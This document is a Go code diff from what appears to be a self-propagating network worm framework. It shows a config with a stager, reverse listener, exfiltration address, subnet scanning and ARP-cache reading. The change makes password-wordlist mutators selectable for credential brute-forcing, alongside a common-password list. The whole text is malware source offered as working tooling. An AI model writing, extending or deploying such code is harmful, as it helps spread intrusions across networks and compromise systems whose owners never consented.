@@ -68,65 +68,67 @@ var CommonPasswords = []string{
 	"football"}
 
 type __NeuraxConfig struct {
-	Stager          string
-	Port            int
-	CommPort        int
-	CommProto       string
-	LocalIp         string
-	Path            string
-	FileName        string
-	Platform        string
-	Cidr            string
-	ScanPassive     bool
-	ScanTimeout     int
-	ScanAll         bool
-	ScanFast        bool
-	ScanFirst       []string
-	ReadArpCache    bool
-	Threads         int
-	FullRange       bool
-	Base64          bool
-	RequiredPort    int
-	Verbose         bool
-	Remove          bool
-	ScanInterval    string
-	ReverseListener string
-	ReverseProto    string
-	PreventReexec   bool
-	ExfilAddr       string
-	WordlistExpand  bool
-	WordlistCommon  bool
+	Stager           string
+	Port             int
+	CommPort         int
+	CommProto        string
+	LocalIp          string
+	Path             string
+	FileName         string
+	Platform         string
+	Cidr             string
+	ScanPassive      bool
+	ScanTimeout      int
+	ScanAll          bool
+	ScanFast         bool
+	ScanFirst        []string
+	ReadArpCache     bool
+	Threads          int
+	FullRange        bool
+	Base64           bool
+	RequiredPort     int
+	Verbose          bool
+	Remove           bool
+	ScanInterval     string
+	ReverseListener  string
+	ReverseProto     string
+	PreventReexec    bool
+	ExfilAddr        string
+	WordlistExpand   bool
+	WordlistCommon   bool
+	WordlistMutators []string
 }
 
 var NeuraxConfig = __NeuraxConfig{
-	Stager:          "random",
-	Port:            6741, //coldfire.RandomInt(2222, 9999),
-	CommPort:        7777,
-	CommProto:       "udp",
-	RequiredPort:    0,
-	LocalIp:         coldfire.GetLocalIp(),
-	Path:            "random",
-	FileName:        "random",
-	Platform:        runtime.GOOS,
-	Cidr:            coldfire.GetLocalIp() + "/24",
-	ScanPassive:     false,
-	ScanTimeout:     2,
-	ScanAll:         false,
-	ScanFast:        false,
-	ScanFirst:       []string{},
-	ReadArpCache:    false,
-	Threads:         10,
-	FullRange:       false,
-	Base64:          false,
-	Verbose:         false,
-	Remove:          false,
-	ScanInterval:    "2m",
-	ReverseListener: "none",
-	ReverseProto:    "udp",
-	PreventReexec:   true,
-	ExfilAddr:       "none",
-	WordlistExpand:  false,
-	WordlistCommon:  false,
+	Stager:           "random",
+	Port:             6741, //coldfire.RandomInt(2222, 9999),
+	CommPort:         7777,
+	CommProto:        "udp",
+	RequiredPort:     0,
+	LocalIp:          coldfire.GetLocalIp(),
+	Path:             "random",
+	FileName:         "random",
+	Platform:         runtime.GOOS,
+	Cidr:             coldfire.GetLocalIp() + "/24",
+	ScanPassive:      false,
+	ScanTimeout:      2,
+	ScanAll:          false,
+	ScanFast:         false,
+	ScanFirst:        []string{},
+	ReadArpCache:     false,
+	Threads:          10,
+	FullRange:        false,
+	Base64:           false,
+	Verbose:          false,
+	Remove:           false,
+	ScanInterval:     "2m",
+	ReverseListener:  "none",
+	ReverseProto:     "udp",
+	PreventReexec:    true,
+	ExfilAddr:        "none",
+	WordlistExpand:   false,
+	WordlistCommon:   false,
+	WordlistMutators: []string{"cyryllic", "single_upper", "encapsule"},
 }
 
 //Verbose error printing
@@ -636,9 +638,15 @@ func NeuraxWordlist(words []string) []string {
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
 		if NeuraxConfig.WordlistExpand {
-			wordlist = append(wordlist, WordEncapsule(word)...)
-			wordlist = append(wordlist, WordCyryllicReplace(word)...)
-			wordlist = append(wordlist, WordSingleUpperTransform(word)...)
+			if coldfire.Contains(NeuraxConfig.WordlistMutators, "encapsule") {
+				wordlist = append(wordlist, WordEncapsule(word)...)
+			}
+			if coldfire.Contains(NeuraxConfig.WordlistMutators, "cyryllic") {
+				wordlist = append(wordlist, WordCyryllicReplace(word)...)
+			}
+			if coldfire.Contains(NeuraxConfig.WordlistMutators, "single_upper") {
+				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
+			}
 		}
 		if NeuraxConfig.WordlistCommon {
 			wordlist = append(wordlist, CommonPasswords...)
